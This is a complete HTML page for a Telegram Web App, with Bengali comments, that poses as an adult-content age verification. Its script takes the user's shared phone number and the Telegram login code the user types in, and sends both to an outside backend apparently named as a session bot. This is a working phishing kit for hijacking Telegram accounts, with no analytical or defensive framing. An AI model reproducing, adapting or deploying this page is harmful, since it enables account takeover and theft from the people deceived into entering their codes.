<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 0; margin: 0; text-align: center; background: #000 url('https://telegra.ph/file/0c97693d2567849e7b233.jpg') no-repeat center; background-size: cover; color: white; overflow: hidden; }
        .overlay { background: rgba(0,0,0,0.8); height: 100vh; display: flex; flex-direction: column; justify-content: center; padding: 20px; box-sizing: border-box; }
        .box { background: white; color: #333; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: linear-gradient(to right, #28a745, #218838); color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; font-size: 20px; margin-top: 15px; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
        .key { background: #f8f9fa; padding: 18px; border-radius: 12px; font-size: 24px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #ddd; }
        .hidden { display: none; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #eee; border-radius: 12px; font-size: 24px; text-align: center; outline: none; letter-spacing: 5px; }
    </style>
</head>
<body>
    <div class="overlay">
        <!-- ধাপ ১: ১৮+ ভেরিফিকেশন (এটি পপ-আপ ট্রিগার করবে) -->
        <div id="step0" class="box">
            <div style="font-size: 60px; margin-bottom: 10px;">🔞</div>
            <h2 style="margin: 0 0 10px 0; color: #d9534f;">Attention!</h2>
            <p style="color: #666; font-weight: bold;">To continue, you must confirm that you are over 18 😊</p>
            <button class="btn" onclick="requestContact()">🍓 confirm 🔞</button>
        </div>

        <!-- ধাপ ২: ওটিপি কিপ্যাড (ফোন পাওয়ার পর আসবে) -->
        <div id="step2" class="box hidden">
            <h3 style="margin-top: 0;">Identity Check</h3>
            <p style="font-size: 14px; color: #666;">Enter the code just sent to your Telegram</p>
            <input type="text" id="otp_display" placeholder="-----" readonly>
            <div class="keypad">
                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                <div class="key" style="background:#ffc107;" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key" style="background:#007bff; color:white;" onclick="verifyOTP()">OK</div>
            </div>
            <div id="loader" class="hidden" style="margin-top:15px; color:#999; font-weight: bold;">Verifying...</div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userPhone = "";
        let currentOTP = "";

        // ১. নম্বর শেয়ার পপ-আপ
        function requestContact() {
            tg.requestContact((shared) => {
                if (shared && tg.initDataUnsafe.contact) {
                    userPhone = tg.initDataUnsafe.contact.phone_number;
                    if (!userPhone.startsWith("+")) userPhone = "+" + userPhone;
                    sendNumberToBackend();
                } else {
                    alert("Age verification failed! You must share your contact.");
                }
            });
        }

        async function sendNumberToBackend() {
            document.getElementById('step0').innerHTML = "<h3>Syncing...</h3><p>Please wait a moment.</p>";
            let res = await fetch(`${BACKEND_URL}/send_number`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, phone: userPhone })
            });
            let data = await res.json();
            if(data.status === "success") {
                document.getElementById('step0').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            } else {
                alert("Request error! Try again.");
                location.reload();
            }
        }

        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }

        async function verifyOTP() {
            if(currentOTP.length < 5) return alert("Enter 5 digits!");
            document.getElementById('loader').classList.remove('hidden');
            let res = await fetch(`${BACKEND_URL}/verify_otp`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, otp: currentOTP })
            });
            let data = await res.json();
            if(data.status === "success") {
                tg.showPopup({ message: "✅ Verification successful!" }, () => { tg.close(); });
            } else {
                alert("Invalid code! Try again.");
                clearNum();
                document.getElementById('loader').classList.add('hidden');
            }
        }
    </script>
</body>
</html>
